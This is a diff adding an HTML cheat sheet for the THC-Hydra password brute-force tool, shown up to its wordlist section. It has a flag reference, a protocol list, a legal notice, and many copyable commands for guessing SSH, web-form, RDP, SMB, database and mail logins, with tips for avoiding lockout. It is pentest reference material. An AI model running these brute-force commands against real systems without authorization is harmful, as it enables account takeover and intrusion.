@@ -1,0 +1,835 @@
+
+<style>
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --surface2: #1c2230;
+    --border: #30363d;
+    --green: #39d353;
+    --green-dim: #238636;
+    --cyan: #58a6ff;
+    --yellow: #e3b341;
+    --red: #f85149;
+    --purple: #bc8cff;
+    --orange: #ffa657;
+    --text: #e6edf3;
+    --text-dim: #8b949e;
+    --text-muted: #6e7681;
+    --mono: 'Courier New', Courier, monospace;
+  }
+  * { box-sizing: border-box; margin: 0; padding: 0; }
+  body, html { background: transparent; color: var(--text); font-family: var(--mono); }
+  
+  .root { padding: 0 0 2rem; }
+  
+  .header {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 10px;
+    padding: 1.2rem 1.5rem;
+    margin-bottom: 1.2rem;
+    display: flex;
+    align-items: center;
+    gap: 1rem;
+  }
+  .logo {
+    font-size: 2rem;
+    font-weight: 900;
+    letter-spacing: -1px;
+    color: var(--green);
+    text-shadow: 0 0 8px #39d35355;
+    font-family: var(--mono);
+  }
+  .logo span { color: var(--red); }
+  .tagline {
+    font-size: 11px;
+    color: var(--text-muted);
+    letter-spacing: 0.08em;
+  }
+  .badge-row {
+    display: flex;
+    gap: 6px;
+    margin-top: 4px;
+    flex-wrap: wrap;
+  }
+  .badge {
+    font-size: 10px;
+    padding: 2px 7px;
+    border-radius: 4px;
+    font-weight: 700;
+    letter-spacing: 0.05em;
+  }
+  .b-green { background: #0d2a14; color: var(--green); border: 1px solid var(--green-dim); }
+  .b-cyan  { background: #0c1a2e; color: var(--cyan); border: 1px solid #1c4a8a; }
+  .b-red   { background: #2d1014; color: var(--red); border: 1px solid #8b1a1a; }
+  .b-yellow{ background: #2b1f05; color: var(--yellow); border: 1px solid #7a5400; }
+
+  .tabs {
+    display: flex;
+    gap: 4px;
+    margin-bottom: 1rem;
+    flex-wrap: wrap;
+  }
+  .tab {
+    padding: 6px 14px;
+    border-radius: 6px;
+    font-size: 12px;
+    cursor: pointer;
+    border: 1px solid var(--border);
+    background: var(--bg);
+    color: var(--text-dim);
+    font-family: var(--mono);
+    transition: all 0.15s;
+    letter-spacing: 0.03em;
+  }
+  .tab:hover { border-color: var(--cyan); color: var(--cyan); background: #0c1a2e; }
+  .tab.active { background: #0c1a2e; color: var(--cyan); border-color: var(--cyan); }
+
+  .panel { display: none; }
+  .panel.active { display: block; }
+
+  .section {
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 8px;
+    margin-bottom: 1rem;
+    overflow: hidden;
+  }
+  .sec-header {
+    padding: 10px 14px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+    font-size: 11px;
+    color: var(--text-muted);
+    letter-spacing: 0.1em;
+    text-transform: uppercase;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+  }
+  .sec-dot {
+    width: 8px; height: 8px;
+    border-radius: 50%;
+    background: var(--green);
+    box-shadow: 0 0 4px var(--green);
+    flex-shrink: 0;
+  }
+  .sec-dot.red { background: var(--red); box-shadow: 0 0 4px var(--red); }
+  .sec-dot.yellow { background: var(--yellow); box-shadow: 0 0 4px var(--yellow); }
+  .sec-dot.cyan { background: var(--cyan); box-shadow: 0 0 4px var(--cyan); }
+  .sec-dot.purple { background: var(--purple); box-shadow: 0 0 4px var(--purple); }
+
+  .cmd-list { padding: 10px 0; }
+  .cmd-item {
+    padding: 8px 14px;
+    border-bottom: 1px solid #1c2230;
+    display: grid;
+    grid-template-columns: 1fr auto;
+    gap: 8px;
+    align-items: start;
+  }
+  .cmd-item:last-child { border-bottom: none; }
+  .cmd { font-size: 12px; color: var(--green); line-height: 1.6; word-break: break-all; }
+  .cmd .flag { color: var(--cyan); }
+  .cmd .val  { color: var(--yellow); }
+  .cmd .svc  { color: var(--orange); }
+  .cmd .host { color: var(--purple); }
+  .cmd .comment { color: var(--text-muted); }
+  .desc { font-size: 11px; color: var(--text-dim); line-height: 1.5; min-width: 120px; text-align: right; }
+
+  .copy-btn {
+    font-size: 10px;
+    padding: 3px 8px;
+    border-radius: 4px;
+    border: 1px solid var(--border);
+    background: var(--surface2);
+    color: var(--text-muted);
+    cursor: pointer;
+    font-family: var(--mono);
+    transition: all 0.15s;
+    white-space: nowrap;
+  }
+  .copy-btn:hover { border-color: var(--green); color: var(--green); background: #0d2a14; }
+
+  .flag-table { width: 100%; border-collapse: collapse; font-size: 12px; }
+  .flag-table th {
+    background: var(--surface);
+    color: var(--text-muted);
+    font-size: 10px;
+    letter-spacing: 0.08em;
+    text-transform: uppercase;
+    padding: 8px 14px;
+    border-bottom: 1px solid var(--border);
+    text-align: left;
+  }
+  .flag-table td { padding: 7px 14px; border-bottom: 1px solid #1c2230; vertical-align: top; }
+  .flag-table tr:last-child td { border-bottom: none; }
+  .flag-table tr:hover td { background: #0d1520; }
+  .fl { color: var(--cyan); font-family: var(--mono); font-weight: 700; font-size: 12px; }
+  .fv { color: var(--yellow); font-size: 11px; }
+  .fd { color: var(--text-dim); font-size: 11px; line-height: 1.5; }
+
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
+  @media (max-width: 560px) { .grid2 { grid-template-columns: 1fr; } }
+
+  .protocol-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+    gap: 6px;
+    padding: 12px 14px;
+  }
+  .proto-chip {
+    padding: 5px 10px;
+    border-radius: 5px;
+    font-size: 11px;
+    border: 1px solid var(--border);
+    background: var(--surface2);
+    color: var(--orange);
+    text-align: center;
+    letter-spacing: 0.04em;
+    cursor: default;
+    transition: all 0.15s;
+  }
+  .proto-chip:hover { border-color: var(--orange); background: #221505; }
+  .proto-chip.auth { color: var(--cyan); border-color: #1c3a5e; background: #0c1a2e; }
+  .proto-chip.web  { color: var(--green); border-color: #0d2a14; background: #0a1a0d; }
+  .proto-chip.net  { color: var(--yellow); border-color: #3a2e00; background: #1f1a00; }
+  .proto-chip.rdp  { color: var(--purple); border-color: #3a2060; background: #1a0f30; }
+
+  .tip-box {
+    margin: 0 14px 12px;
+    border-radius: 6px;
+    padding: 10px 12px;
+    font-size: 11px;
+    line-height: 1.6;
+    border-left: 3px solid;
+  }
+  .tip-green { border-color: var(--green); background: #0a1e0d; color: #7ee89a; }
+  .tip-yellow { border-color: var(--yellow); background: #1f1600; color: #e8c97e; }
+  .tip-red { border-color: var(--red); background: #1e0a0a; color: #e87e7e; }
+  .tip-cyan { border-color: var(--cyan); background: #0a1624; color: #7ec8ff; }
+
+  .prompt-line {
+    display: flex;
+    align-items: flex-start;
+    gap: 6px;
+    padding: 5px 14px;
+    font-size: 12px;
+    line-height: 1.6;
+    border-bottom: 1px solid #1c2230;
+  }
+  .prompt-line:last-child { border-bottom: none; }
+  .ps1 { color: var(--green); flex-shrink: 0; }
+  .pc { color: var(--text); word-break: break-all; }
+  .pc .flag { color: var(--cyan); }
+  .pc .val { color: var(--yellow); }
+  .pc .svc { color: var(--orange); }
+  .pc .host { color: var(--purple); }
+
+  .syntax-box {
+    font-size: 12px;
+    padding: 12px 14px;
+    color: var(--text-dim);
+    line-height: 1.8;
+    border-bottom: 1px solid var(--border);
+  }
+  .syntax-box .kw { color: var(--green); font-weight: 700; }
+  .syntax-box .opt { color: var(--cyan); }
+  .syntax-box .req { color: var(--yellow); }
+  .syntax-box .tgt { color: var(--purple); }
+  .syntax-box .svc { color: var(--orange); }
+
+  .warning-banner {
+    background: #1e0a0a;
+    border: 1px solid #7a1a1a;
+    border-radius: 8px;
+    padding: 12px 16px;
+    font-size: 11px;
+    color: #c0504a;
+    margin-bottom: 1rem;
+    display: flex;
+    gap: 10px;
+    align-items: flex-start;
+  }
+  .warn-icon { font-size: 16px; flex-shrink: 0; margin-top: 1px; }
+
+  .search-box {
+    width: 100%;
+    padding: 8px 12px;
+    background: var(--bg);
+    border: 1px solid var(--border);
+    border-radius: 6px;
+    color: var(--text);
+    font-family: var(--mono);
+    font-size: 12px;
+    margin-bottom: 1rem;
+    outline: none;
+  }
+  .search-box:focus { border-color: var(--cyan); }
+  .search-box::placeholder { color: var(--text-muted); }
+
+  .hidden { display: none !important; }
+</style>
+
+<div class="root">
+  <div class="header">
+    <div>
+      <div class="logo">HY<span>DR</span>A <span style="color:var(--text-muted);font-size:1rem;">v9.x</span></div>
+      <div class="tagline">MASTER CHEAT SHEET — Network Login Brute-Force Tool</div>
+      <div class="badge-row">
+        <span class="badge b-green">THC-Hydra</span>
+        <span class="badge b-cyan">50+ Protocols</span>
+        <span class="badge b-yellow">Parallel Attacks</span>
+        <span class="badge b-red">Pentest Use Only</span>
+      </div>
+    </div>
+  </div>
+
+  <div class="warning-banner">
+    <span class="warn-icon">⚠</span>
+    <span><strong>Legal Notice:</strong> Use Hydra only on systems you own or have explicit written authorization to test. Unauthorized use is illegal under the Computer Fraud and Abuse Act (CFAA) and equivalent laws globally. This cheat sheet is for authorized penetration testers, CTF players, and security researchers only.</span>
+  </div>
+
+  <div class="tabs">
+    <button class="tab active" onclick="switchTab('syntax')">Syntax & Flags</button>
+    <button class="tab" onclick="switchTab('protocols')">Protocols</button>
+    <button class="tab" onclick="switchTab('examples')">Attack Examples</button>
+    <button class="tab" onclick="switchTab('wordlists')">Wordlists & Tips</button>
+    <button class="tab" onclick="switchTab('advanced')">Advanced & Evasion</button>
+  </div>
+
+  <!-- SYNTAX & FLAGS -->
+  <div id="tab-syntax" class="panel active">
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot cyan"></span>Base Syntax</div>
+      <div class="syntax-box">
+        <span class="kw">hydra</span> [<span class="opt">options</span>] [<span class="tgt">target</span>] <span class="svc">service</span> [<span class="opt">service-options</span>]<br>
+        <span class="kw">hydra</span> <span class="opt">-l</span> &lt;<span class="req">user</span>&gt; <span class="opt">-P</span> &lt;<span class="req">passlist</span>&gt; <span class="tgt">IP</span>/<span class="tgt">hostname</span> <span class="svc">protocol</span><br>
+        <span class="kw">hydra</span> <span class="opt">-L</span> &lt;<span class="req">userlist</span>&gt; <span class="opt">-P</span> &lt;<span class="req">passlist</span>&gt; <span class="opt">-M</span> &lt;<span class="req">targets</span>&gt; <span class="svc">protocol</span>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot cyan"></span>Core Flags Reference</div>
+      <table class="flag-table">
+        <thead><tr><th>Flag</th><th>Value</th><th>Description</th></tr></thead>
+        <tbody id="flag-body">
+          <tr><td class="fl">-l</td><td class="fv">username</td><td class="fd">Single username/login</td></tr>
+          <tr><td class="fl">-L</td><td class="fv">file.txt</td><td class="fd">Load usernames from file (one per line)</td></tr>
+          <tr><td class="fl">-p</td><td class="fv">password</td><td class="fd">Single password</td></tr>
+          <tr><td class="fl">-P</td><td class="fv">wordlist.txt</td><td class="fd">Load passwords from file (one per line)</td></tr>
+          <tr><td class="fl">-C</td><td class="fv">combo.txt</td><td class="fd">Colon-separated login:pass combo file</td></tr>
+          <tr><td class="fl">-M</td><td class="fv">targets.txt</td><td class="fd">Multiple targets file (one host per line)</td></tr>
+          <tr><td class="fl">-t</td><td class="fv">4</td><td class="fd">Number of parallel tasks/threads per target (default: 16)</td></tr>
+          <tr><td class="fl">-T</td><td class="fv">64</td><td class="fd">Total number of concurrent connections (with -M)</td></tr>
+          <tr><td class="fl">-s</td><td class="fv">PORT</td><td class="fd">Custom port (override default service port)</td></tr>
+          <tr><td class="fl">-S</td><td class="fv"></td><td class="fd">Use SSL/TLS connection</td></tr>
+          <tr><td class="fl">-o</td><td class="fv">out.txt</td><td class="fd">Write found credentials to file</td></tr>
+          <tr><td class="fl">-b</td><td class="fv">json</td><td class="fd">Output format: text, json, jsonv1</td></tr>
+          <tr><td class="fl">-v</td><td class="fv"></td><td class="fd">Verbose: show attempt messages</td></tr>
+          <tr><td class="fl">-V</td><td class="fv"></td><td class="fd">Very verbose: show each login:pass attempt</td></tr>
+          <tr><td class="fl">-d</td><td class="fv"></td><td class="fd">Debug mode (full protocol output)</td></tr>
+          <tr><td class="fl">-q</td><td class="fv"></td><td class="fd">Quiet mode (suppress errors)</td></tr>
+          <tr><td class="fl">-f</td><td class="fv"></td><td class="fd">Exit after first found credentials (per target)</td></tr>
+          <tr><td class="fl">-F</td><td class="fv"></td><td class="fd">Exit after first found credentials globally</td></tr>
+          <tr><td class="fl">-u</td><td class="fv"></td><td class="fd">Loop around users, not passwords (try all users per pass)</td></tr>
+          <tr><td class="fl">-e</td><td class="fv">nsr</td><td class="fd">Try extra: n=null, s=login as pass, r=reversed login</td></tr>
+          <tr><td class="fl">-w</td><td class="fv">30</td><td class="fd">Wait time (seconds) for response (default: 32)</td></tr>
+          <tr><td class="fl">-W</td><td class="fv">1</td><td class="fd">Seconds between each connection per thread</td></tr>
+          <tr><td class="fl">-c</td><td class="fv">30</td><td class="fd">Seconds to wait between retries on connection error</td></tr>
+          <tr><td class="fl">-4/-6</td><td class="fv"></td><td class="fd">Force IPv4 or IPv6</td></tr>
+          <tr><td class="fl">-x</td><td class="fv">3:5:a</td><td class="fd">Password brute-force generation: min:max:charset</td></tr>
+          <tr><td class="fl">-y</td><td class="fv"></td><td class="fd">Disable symbol chars in brute-force generation</td></tr>
+          <tr><td class="fl">-I</td><td class="fv"></td><td class="fd">Ignore an existing restore file</td></tr>
+          <tr><td class="fl">-R</td><td class="fv"></td><td class="fd">Restore a previous aborted/crashed session</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot yellow"></span>Brute-force Charset (-x flag)</div>
+      <table class="flag-table">
+        <thead><tr><th>Charset Code</th><th>Meaning</th><th>Example</th></tr></thead>
+        <tbody>
+          <tr><td class="fl">a</td><td class="fd">lowercase a-z</td><td class="fv">-x 4:6:a → 4 to 6 char lowercase</td></tr>
+          <tr><td class="fl">A</td><td class="fd">uppercase A-Z</td><td class="fv">-x 6:8:A → uppercase only</td></tr>
+          <tr><td class="fl">1</td><td class="fd">digits 0-9</td><td class="fv">-x 4:4:1 → 4-digit PIN</td></tr>
+          <tr><td class="fl">a1</td><td class="fd">alphanumeric (no symbols)</td><td class="fv">-x 6:8:a1</td></tr>
+          <tr><td class="fl">aA1</td><td class="fd">mixed case + digits</td><td class="fv">-x 8:10:aA1</td></tr>
+          <tr><td class="fl">aA1!</td><td class="fd">all printable chars</td><td class="fv">-x 8:12:aA1!</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <div class="tip-box tip-green" style="margin:0 0 1rem;">
+      <strong>Pro tip:</strong> Always use <code>-t 4</code> for SSH (avoids MaxStartups lockout), <code>-t 16</code> is fine for most web/HTTP attacks.
+    </div>
+  </div>
+
+  <!-- PROTOCOLS -->
+  <div id="tab-protocols" class="panel">
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot orange"></span>Authentication Protocols</div>
+      <div class="protocol-grid">
+        <div class="proto-chip auth">ssh</div>
+        <div class="proto-chip auth">ftp</div>
+        <div class="proto-chip auth">telnet</div>
+        <div class="proto-chip auth">smtp</div>
+        <div class="proto-chip auth">smtps</div>
+        <div class="proto-chip auth">pop3</div>
+        <div class="proto-chip auth">pop3s</div>
+        <div class="proto-chip auth">imap</div>
+        <div class="proto-chip auth">imaps</div>
+        <div class="proto-chip auth">ldap2</div>
+        <div class="proto-chip auth">ldap3</div>
+        <div class="proto-chip auth">ldaps</div>
+        <div class="proto-chip auth">mssql</div>
+        <div class="proto-chip auth">mysql</div>
+        <div class="proto-chip auth">postgres</div>
+        <div class="proto-chip auth">oracle</div>
+        <div class="proto-chip auth">mongodb</div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot green"></span>Web & HTTP Protocols</div>
+      <div class="protocol-grid">
+        <div class="proto-chip web">http-get</div>
+        <div class="proto-chip web">http-post</div>
+        <div class="proto-chip web">https-get</div>
+        <div class="proto-chip web">https-post</div>
+        <div class="proto-chip web">http-get-form</div>
+        <div class="proto-chip web">http-post-form</div>
+        <div class="proto-chip web">https-get-form</div>
+        <div class="proto-chip web">https-post-form</div>
+        <div class="proto-chip web">http-proxy</div>
+        <div class="proto-chip web">http-proxy-urlenum</div>
+        <div class="proto-chip web">http-form-get</div>
+        <div class="proto-chip web">http-form-post</div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot yellow"></span>Network & Remote Access</div>
+      <div class="protocol-grid">
+        <div class="proto-chip net">rdp</div>
+        <div class="proto-chip net">vnc</div>
+        <div class="proto-chip net">smb</div>
+        <div class="proto-chip net">smbnt</div>
+        <div class="proto-chip net">snmp</div>
+        <div class="proto-chip net">rsh</div>
+        <div class="proto-chip net">rlogin</div>
+        <div class="proto-chip net">rexec</div>
+        <div class="proto-chip net">nntps</div>
+        <div class="proto-chip net">nntp</div>
+        <div class="proto-chip net">s7-300</div>
+        <div class="proto-chip net">cisco</div>
+        <div class="proto-chip net">cisco-enable</div>
+        <div class="proto-chip net">firebird</div>
+        <div class="proto-chip net">pcnfs</div>
+        <div class="proto-chip net">xmpp</div>
+        <div class="proto-chip net">sip</div>
+        <div class="proto-chip net">redis</div>
+        <div class="proto-chip net">adam6500</div>
+        <div class="proto-chip net">asterisk</div>
+        <div class="proto-chip net">afp</div>
+        <div class="proto-chip net">cvs</div>
+        <div class="proto-chip net">svn</div>
+        <div class="proto-chip net">teamspeak</div>
+        <div class="proto-chip net">vmauthd</div>
+        <div class="proto-chip net">http-head</div>
+      </div>
+    </div>
+
+    <div class="tip-box tip-cyan" style="margin:0 0 1rem;">
+      <strong>List all modules:</strong> <code>hydra -U http-post-form</code> — shows module-specific options for any protocol.
+      Use <code>hydra --list-tasks</code> to see active tasks live.
+    </div>
+  </div>
+
+  <!-- ATTACK EXAMPLES -->
+  <div id="tab-examples" class="panel">
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot cyan"></span>SSH</div>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Single user, password list</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">/usr/share/wordlists/rockyou.txt</span> <span class="host">192.168.1.10</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Userlist + passlist, low threads (safe)</span><br>hydra <span class="flag">-L</span> <span class="val">users.txt</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-t</span> <span class="val">4</span> <span class="flag">-f</span> <span class="host">10.10.10.5</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Custom port, verbose, stop on first hit</span><br>hydra <span class="flag">-l</span> <span class="val">root</span> <span class="flag">-P</span> <span class="val">rockyou.txt</span> <span class="flag">-s</span> <span class="val">2222</span> <span class="flag">-V</span> <span class="flag">-f</span> <span class="host">target.com</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Try null/same-as-login/reversed passwords too</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-e</span> <span class="val">nsr</span> <span class="host">10.0.0.1</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot green"></span>HTTP/HTTPS Login Forms</div>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># POST form — syntax: /path:body:fail_string</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">rockyou.txt</span> <span class="host">10.10.10.1</span> <span class="svc">http-post-form</span> <span class="val">"/login:user=^USER^&pass=^PASS^:Invalid credentials"</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># HTTPS POST form with cookie session</span><br>hydra <span class="flag">-L</span> <span class="val">users.txt</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-S</span> <span class="host">site.com</span> <span class="svc">https-post-form</span> <span class="val">"/wp-login.php:log=^USER^&pwd=^PASS^:ERROR"</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># With success condition (use :S= prefix instead)</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">192.168.0.1</span> <span class="svc">http-post-form</span> <span class="val">"/admin/login:username=^USER^&password=^PASS^:S=dashboard"</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># HTTP Basic Auth</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">192.168.1.1</span> <span class="svc">http-get</span> <span class="val">/admin/</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># GET form with CSRF (add cookie H= header)</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">target.com</span> <span class="svc">http-post-form</span> <span class="val">"/login:user=^USER^&pass=^PASS^:F=wrong:H=Cookie\: session=abc123"</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+      </div>
+      <div class="tip-box tip-yellow">
+        <strong>Form string format:</strong> <code>/path:POST_BODY:FAIL_STRING</code><br>
+        Use <code>F=text</code> for failure string, <code>S=text</code> for success string.<br>
+        Add <code>H=Header: value</code> to inject custom headers (Cookie, User-Agent, etc.)
+      </div>
+    </div>
+
+    <div class="grid2">
+      <div class="section">
+        <div class="sec-header"><span class="sec-dot red"></span>FTP</div>
+        <div class="cmd-list">
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-l</span> <span class="val">ftpuser</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">10.0.0.1</span> <span class="svc">ftp</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-L</span> <span class="val">users.txt</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-t</span> <span class="val">10</span> <span class="host">ftp.target.com</span> <span class="svc">ftp</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="sec-header"><span class="sec-dot red"></span>Telnet</div>
+        <div class="cmd-list">
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">192.168.0.1</span> <span class="svc">telnet</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-l</span> <span class="val">root</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-t</span> <span class="val">16</span> <span class="flag">-vV</span> <span class="host">10.0.1.2</span> <span class="svc">telnet</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid2">
+      <div class="section">
+        <div class="sec-header"><span class="sec-dot purple"></span>RDP</div>
+        <div class="cmd-list">
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-l</span> <span class="val">Administrator</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">10.10.10.1</span> <span class="svc">rdp</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-L</span> <span class="val">users.txt</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-t</span> <span class="val">4</span> <span class="host">10.0.0.5</span> <span class="svc">rdp</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="sec-header"><span class="sec-dot purple"></span>VNC</div>
+        <div class="cmd-list">
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">192.168.1.5</span> <span class="svc">vnc</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-s</span> <span class="val">5901</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">10.0.0.10</span> <span class="svc">vnc</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid2">
+      <div class="section">
+        <div class="sec-header"><span class="sec-dot yellow"></span>MySQL / MSSQL</div>
+        <div class="cmd-list">
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-l</span> <span class="val">root</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">10.0.0.1</span> <span class="svc">mysql</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-l</span> <span class="val">sa</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">10.0.0.1</span> <span class="svc">mssql</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="sec-header"><span class="sec-dot yellow"></span>SMB / Samba</div>
+        <div class="cmd-list">
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-l</span> <span class="val">administrator</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">10.0.0.5</span> <span class="svc">smb</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-L</span> <span class="val">users.txt</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">10.0.0.5</span> <span class="svc">smb</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="grid2">
+      <div class="section">
+        <div class="sec-header"><span class="sec-dot cyan"></span>SMTP</div>
+        <div class="cmd-list">
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-l</span> <span class="val">user@domain.com</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">mail.target.com</span> <span class="svc">smtp</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-l</span> <span class="val">user</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-S</span> <span class="flag">-s</span> <span class="val">587</span> <span class="host">smtp.target.com</span> <span class="svc">smtp</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+        </div>
+      </div>
+      <div class="section">
+        <div class="sec-header"><span class="sec-dot cyan"></span>SNMP / Redis</div>
+        <div class="cmd-list">
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-P</span> <span class="val">community.txt</span> <span class="host">10.0.0.1</span> <span class="svc">snmp</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+          <div class="cmd-item">
+            <div class="cmd">hydra <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="host">10.0.0.1</span> <span class="svc">redis</span></div>
+            <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot green"></span>Multiple Targets (-M)</div>
+      <div class="cmd-list">
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Attack multiple hosts at once</span><br>hydra <span class="flag">-l</span> <span class="val">admin</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-M</span> <span class="val">targets.txt</span> <span class="svc">ssh</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+        <div class="cmd-item">
+          <div class="cmd"><span class="comment"># Targets file with per-host port override (ip:port per line)</span><br>hydra <span class="flag">-L</span> <span class="val">users.txt</span> <span class="flag">-P</span> <span class="val">pass.txt</span> <span class="flag">-M</span> <span class="val">hosts.txt</span> <span class="flag">-T</span> <span class="val">20</span> <span class="svc">ftp</span></div>
+          <button class="copy-btn" onclick="copyCmd(this)">copy</button>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- WORDLISTS & TIPS -->
+  <div id="tab-wordlists" class="panel">
+    <div class="section">
+      <div class="sec-header"><span class="sec-dot green"></span>Top Wordlist Locations (Kali / Parrot)</div>
+      <div class="cmd-list">
+        <div class="prompt-line"><span class="ps1">$</span><span class="pc"><span class="flag">ls</span> /usr/share/wordlists/</span></div>
+        <div class="prompt-line"><span class="ps1">$</span><span class="pc"><span class="val">/usr/share/wordlists/rockyou.txt</span>         <span class="comment"># 14M+ passwords, king of wordlists</span></span></div>
+        <div class="prompt-line"><span class="ps1">$</span><span class="pc"><span class="val">/usr/share/seclists/Passwords/</span>             <span class="comment"># SecLists — huge collection</span></span></div>
+        <div class="prompt-line"><span class="ps1">$</span><span class="pc"><span class="val">/usr/share/seclists/Usernames/</span>             <span class="comment"># Username lists</span></span></div>
